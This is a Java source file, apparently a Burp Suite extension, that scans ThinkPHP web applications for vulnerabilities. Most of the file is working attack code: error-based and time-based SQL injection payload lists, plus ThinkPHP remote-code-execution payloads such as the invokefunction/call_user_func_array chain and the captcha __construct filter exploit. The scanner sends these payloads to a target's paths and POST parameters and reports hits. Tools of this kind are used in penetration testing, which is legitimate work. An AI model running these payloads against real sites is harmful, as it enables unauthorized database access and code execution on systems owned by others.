package burp;
import java.io.*;
import java.util.HashMap;
import java.util.Map;
import org.apache.http.Header;
import org.apache.http.HttpHost;
import org.apache.http.HttpEntity;
import org.apache.http.client.HttpClient;
import org.apache.http.client.config.RequestConfig;
import org.apache.http.client.methods.HttpGet;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.entity.StringEntity;
import org.apache.http.impl.client.HttpClients;
import org.apache.http.util.EntityUtils;
import org.apache.http.HttpResponse;
import java.util.Date;
import java.io.PrintWriter;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class http {
    private HttpClient client = null;
    private HttpResponse response = null;
    private Map<String,String> headers = new HashMap<>();
    private static String sleep = "0";
    public String debug;
    private HashMap<String,String> BugBug = new HashMap<>();
    public http()
    {
        this.client = HttpClients.createDefault();
    }
    private String[] payload()
    {
        String[] payloads = {
                "%1$s=%2$s'",
                "%1$s[]=exp&%1$s[]=%2$s'",
                "%1$s[]=bind&%1$s[]=%2$s'",
                "%1$s=%%20*/'--%%20--"
        };
        return payloads;
    }
    public static void setSleep(String sleep)
    {
        http.sleep = sleep;
    }
    private Map<String,String> rce_payload()
    {
        Map<String,String> payloads = new HashMap<>();
        payloads.put("5_0","/index.php?s=/%1$s/%%5cthink%%5capp/invokefunction&function=call_user_func_array&vars[0]=assert&vars[1][]=phpinfo()");
        payloads.put("3","/index.php/home/index/index/%40%7b%70%68%70%69%6e%66%6f%28%29%7d");
        payloads.put("5_0_23","/index.php?s=captcha");
        payloads.put("display","%1$s=%%3c%%70%%68%%70%%3e%%70%%68%%70%%69%%6e%%66%%6f%%28%%29%%3b%%3c%%2f%%70%%68%%70%%3e");
        return payloads;
    }
    private String[] time_payload()
    {
        String[] payloads = {
                "%1$s=%2$s%%20and%%20sleep(5)%%20--%%20--",
                "%1$s=%2$s)%%20and%%20sleep(5)%%20--%%20--",
                "%1$s[]=exp&%1$s[]==%2$s%%20and%%20sleep(5)%%20--%%20--",
                "%1$s=%2$s'%%20and%%20sleep(5)%%20--%%20--",
                "%1$s=%2$s')%%20and%%20sleep(5)%%20--%%20--",
                "%1$s=%2$s'%%20or%%20sleep(5)%%20--%%20--",
                "%1$s=%2$s')%%20or%%20sleep(5)%%20--%%20--",
                "%1$s[]=exp&%1$s[]==%2$s'%%20and%%20sleep(5)%%20--%%20--",
                "%1$s[]=exp&%1$s[]==%2$s')%%20and%%20sleep(5)%%20--%%20--",
                "%1$s[]=exp&%1$s[]==%2$s%%20or%%20sleep(5)%%20--%%20--",
                "%1$s[]=exp&%1$s[]==%2$s'%%20or%%20sleep(5)%%20--%%20--",
                "%1$s[]=exp&%1$s[]==%2$s')%%20and%%20sleep(5)%%20--%%20--",
                "%1$s=%%20*/where%%201=1%%20and%%20sleep(5)%%20--%%20--",
        };
        return payloads;
    }

    private String doGet(String url,PrintWriter s)
    {
        String res = "";
        HttpGet httpget = new HttpGet(url);
        RequestConfig config = RequestConfig.custom().
                setSocketTimeout(10000).
                setConnectionRequestTimeout(10000).
                setConnectTimeout(10000).
                //setProxy(new HttpHost("127.0.0.1",8080)).
                build();
        for(String header : headers.keySet())
        {
            httpget.setHeader(header,headers.get(header));
        }
        httpget.setConfig(config);
        try{
            response = client.execute(httpget);
            HttpEntity entity = response.getEntity();
            if(response != null)
            {
                res += response.getStatusLine().getStatusCode() + "\n";
                Header[] responseHeaders = response.getAllHeaders();
                for(int responseHeadersKey = 0;responseHeadersKey < responseHeaders.length;responseHeadersKey++)
                {
                    res += responseHeaders[responseHeadersKey] + "\n";
                }
                res += "\n";
                if(entity != null)
                {
                    res += EntityUtils.toString(entity,"utf-8");
                }
                EntityUtils.consume(entity);

            }
            return res;
        }catch (IOException e)
        {
            //e.printStackTrace(s);
            return res;
        }
    }

    private String doPost(String url,String param,PrintWriter s)
    {

        String res = "";
        HttpPost httppost = new HttpPost(url);
        RequestConfig config = RequestConfig.custom().
                setConnectTimeout(10000).
                setConnectionRequestTimeout(10000).
                setSocketTimeout(10000).
                //setProxy(new HttpHost("127.0.0.1",8080)).
                build();
        StringEntity params = new StringEntity(param,"utf-8");
        httppost.setEntity(params);
        for(String header : headers.keySet())
        {
            httppost.setHeader(header,headers.get(header));
        }
        httppost.setConfig(config);
        try{
            response = client.execute(httppost);
            if(response != null)
            {
                HttpEntity entity = response.getEntity();
                res += response.getStatusLine().getStatusCode() + "\n";
                Header[] responseHeaders = response.getAllHeaders();
                for(int responseHeadersKey=0;responseHeadersKey<responseHeaders.length;responseHeadersKey++)
                {
                    res += responseHeaders[responseHeadersKey] + "\n";
                }
                res += "\n";
                if(entity != null)
                {
                    res += EntityUtils.toString(entity,"utf-8");
                }
            }
            return res;
        }catch (Exception e)
        {
            //e.printStackTrace(s);
            return "NONONONONO";

        }
    }
    public void doHttp(String url,String request,PrintWriter stdout)
    {
        String[] requests = request.split("\r\n");
        String[] request_one = requests[0].split(" ");
        for(int req_header=1;req_header<requests.length-1;req_header++)
        {

                if(requests[req_header].equals(""))
                {
                    break;
                }

                String[] header = requests[req_header].split(":",2);
                if(header[0].equals("Content-Length"))
                {
                    continue;
                }
                headers.put(header[0],header[1]);
        }
            String path_spilt = request_one[1].replace(".html", "");
            path_spilt = path_spilt.replace(".htm", "");
            Pattern pattern = Pattern.compile("index\\.php\\?([_A-Za-z0-9])=.*?&([_A-Za-z0-9])=.*?&([_A-Za-z0-9])");
            Matcher matcher = pattern.matcher(path_spilt);
            if (path_spilt.contains("?s="))///index.php?s=/home/index/index/uid/1/pid/2
            {
                path_spilt = path_spilt.replace("?s=", "");
            } else if (matcher.find())// /index.php?m=home&a=index&c=index&uid=1&pid=1
            {
                path_spilt = path_spilt.replace("?" + matcher.group(1) + "=", "/");
                path_spilt = path_spilt.replace("&" + matcher.group(2) + "=", "/");
                path_spilt = path_spilt.replace("&" + matcher.group(3) + "=", "/");
                path_spilt = path_spilt.replace("&", "/");
                path_spilt = path_spilt.replace("=", "/");
            }
            String[] path_spilts = path_spilt.split("/");
            String uri = url.replace(request_one[1],"");
            for (int x = path_spilts.length - 1; x > 5; x = x - 2) {
                String p = "";
                String target = path_spilts[x - 1] + "/" + path_spilts[x];
                String path_target = path_spilt.replace("/"+target, "");
                for (String payload : payload()) {
                    target = "/?" + String.format(payload, path_spilts[x - 1], path_spilts[x]);
                    p = path_target + target;

                    if(request_one[0].equals("POST"))
                    {
                        error_sqli_check(uri + p,requests[requests.length-1],stdout);
                    }else {

                        error_sqli_check(uri + p,stdout);
                    }

                }

                for (String payload : time_payload())
                {
                    target = "/?" + String.format(payload, path_spilts[x -1],path_spilts[x]);
                    p = path_target + target;
                    uri = url.replace(request_one[1],"");
                    if(request_one[0].equals("POST"))
                    {
                        time_sqli_check(uri + p,requests[requests.length-1],stdout);
                    }else {
                        time_sqli_check(uri + p,stdout);
                    }
                }

                for (String pys : rce_payload().keySet())
                {
                    String str = "";
                    uri = url.replace(request_one[1],"");
                    if(pys.equals("5_0"))
                    {
                        str = String.format(rce_payload().get(pys),path_spilts[2]);
                    }
                    if(pys.equals("3"))
                    {
                        str = rce_payload().get(pys);
                    }
                    if(pys.equals("5_0_23"))
                    {
                        str = rce_payload().get(pys);
                        String param =  "_method=__construct&filter[]=phpinfo&method=get&server[REQUEST_METHOD]=1";
                        rce_check(uri + str,param,stdout);
                        continue;
                    }
                    if(pys.equals("display"))
                    {
                        target = "/?" + String.format(rce_payload().get(pys), path_spilts[x-1]);
                        p = path_target + target;
                        uri = url.replace(request_one[1],"");
                        if(request_one[0].equals("POST"))
                        {
                            rce_check(uri + p,requests[requests.length-1],stdout);
                        }else {
                            rce_check(uri + p,stdout);
                        }
                    }
                    if(request_one[0].equals("POST"))
                    {
                        rce_check(uri + str,requests[requests.length-1],stdout);
                    }else {
                        rce_check(uri + str,stdout);
                    }
                }

            }

        if(request_one[0].equals("POST"))
        {

            String[] params = requests[requests.length-1].split("&");
            for(String target : params)
            {
                String param_target = requests[requests.length-1].replace(target,"b=b");
                String[] targets = target.split("=");

                for(String payload : time_payload())
                {
                    String p = "";
                    String p_target = String.format(payload,targets[0],targets[1]);
                    p = param_target + "&" + p_target;
                    time_sqli_check(url,p,stdout);

                }
                for(String payload : payload())
                {
                    String p = "";
                    String p_target = String.format(payload,targets[0],targets[1]);
                    p = param_target + "&" + p_target;
                    error_sqli_check(url,p,stdout);


                }
                for(String payload : rce_payload().keySet())
                {
                    String p ="";
                    if(payload.contains("display"))
                    {
                        String p_target = String.format(rce_payload().get(payload),targets[0]);
                        p = param_target + "&" + p_target;
                    }
                    rce_check(url,p,stdout);
                }

            }

        }
        if(!BugBug.isEmpty())
        {

            for (String key:BugBug.keySet()) {
                stdout.println(BugBug.get(key));
            }
        }
    }
    private void T_sleep()
    {
        if(!sleep.equals("0")) {
            int x = 0;
            try {
                x = Integer.parseInt(sleep);
                x = x * 1000;
                Thread.sleep(x);
            } catch (Exception e) {
                return;
            }
        }
    }

    private void error_sqli_check(String url,PrintWriter s)
    {
        T_sleep();
        String x = doGet(url,s);
        if(x.indexOf("MySQL") != -1)
        {

            BugBug.put("error_sqli","报错注入： "+url);
        }
    }

    private void error_sqli_check(String url,String param,PrintWriter s)
    {
        T_sleep();
        String x = doPost(url,param,s);
        if(x.indexOf("MySQL") != -1)
        {
            BugBug.put("error_sqli","报错注入:  " + url + "  POST_DATA : " + param);
        }
    }

    private void time_sqli_check(String url,PrintWriter s)
    {
        T_sleep();
        Date d1 = new Date();
        long dd1 = d1.getTime();
        doGet(url,s);
        Date d2 = new Date();
        long dd2 = d2.getTime();
        if((dd2 - dd1) > 5000 && !BugBug.containsKey("time_sqli")){
            BugBug.put("time_sqli","延时注入： " + url);
        }
    }

    private void time_sqli_check(String url,String param,PrintWriter s)
    {
        T_sleep();
        Date d1 = new Date();
        long dd1 = d1.getTime();
        doPost(url,param,s);
        Date d2 = new Date();
        long dd2 = d2.getTime();
        if((dd2 - dd1) > 5000 && !BugBug.containsKey("time_sqli"))
        {
            BugBug.put("time_sqli","延时注入:  " + url +"  POST_DATA: " + param);
        }
    }

    private void rce_check(String url,PrintWriter s)
    {
        T_sleep();
        String x = doGet(url,s);
        if(x.indexOf("<title>phpinfo()</title>") != -1)
        {
            BugBug.put("rce","代码执行： " + url);
        }
    }

    private void rce_check(String url,String param,PrintWriter s)
    {
        T_sleep();
        String x =doPost(url,param,s);
        if(x.indexOf("<title>phpinfo()</title>") != -1)
        {
            BugBug.put("rce","代码执行： " + url + "POST_DATA" + param);
        }
    }

    public static void main(String[] args) throws InterruptedException,FileNotFoundException
    {
        http tt = new http();
        String aaa = "POST /index.php/home/index/pp HTTP/1.1\r\n" +
                "Host: www.thinkphp.com\r\n" +
                "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:67.0) Gecko/20100101 Firefox/67.0\r\n" +
                "Accept: */*\r\n" +
                "Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\r\n" +
                "Referer: http://www.tpshop.com/\r\n" +
                "Content-Type: application/x-www-form-urlencoded\r\n" +
                "Connection: close\r\n" +
                "Cookie: province_id=1; city_id=2; district_id=3; is_mobile=0; PHPSESSID=t0lirfmlh8s1qb2uunldcc3jt2\r\n" +
                "\r\n" +
                "fname=b";
        String bbb= "GET /index.php/home/index/index/testdisplay/1 HTTP/1.1\n" +
                "Host: www.thinkphp.com:80\n" +
                "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:67.0) Gecko/20100101 Firefox/67.0\n" +
                "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\n" +
                "Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\n" +
                "Connection: close\n" +
                "Cookie: province_id=1; city_id=2; district_id=3\n" +
                "Upgrade-Insecure-Requests: 1\n" +
                "\n";


       PrintWriter s = new PrintWriter("F:\\phpstudy\\WWW\\a.txt");
       //String a = tt.doGet("https://www.dnfzhushou3.cn:443",s);
       //System.out.println(a);
        tt.doHttp("http://www.thinkphp.com",aaa,s);
       String url = "/index.php?g=Portal&m=Page&a=newlist&id=1";
       url_tiqu(url);
    }
    public static String url_tiqu(String url)
    {
        Pattern pattern = Pattern.compile("index\\.php\\?([_A-Za-z0-9])=.*?&([_A-Za-z0-9])=.*?&([_A-Za-z0-9])");
        Matcher matcher = pattern.matcher(url);
        while (matcher.find())
        {
            System.out.println(matcher.group(2));
        }
        return "NNONO";
    }
}
